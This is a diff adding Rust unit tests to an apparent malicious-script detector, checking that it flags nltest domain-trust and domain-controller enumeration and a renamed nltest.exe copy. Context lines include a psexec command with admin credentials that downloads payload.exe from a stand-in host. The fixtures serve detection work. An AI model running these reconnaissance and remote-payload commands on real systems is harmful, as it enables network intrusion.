@@ -3873,6 +3873,62 @@ C:\Users\Public\pp.tmp -n 203.0.113.10
     }
 
     #[test]
+    fn nltest_domain_discovery_emits_enumeration_trait() {
+        let report = analyze(
+            br#"nltest /domain_trusts
+nltest /dclist:corp.example
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "nltest-domain" && command == "nltest /domain_trusts"
+            )),
+            "nltest domain trusts enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "nltest-domain" && command == "nltest /dclist:corp.example"
+            )),
+            "nltest dclist enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_nltest_alias_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\nltest.exe C:\Users\Public\nl.tmp
+C:\Users\Public\nl.tmp /domain_trusts
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nl.tmp"#)
+            )),
+            "copied nltest alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "nltest-domain" && command == "nltest.exe /domain_trusts"
+            )),
+            "copied nltest domain enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
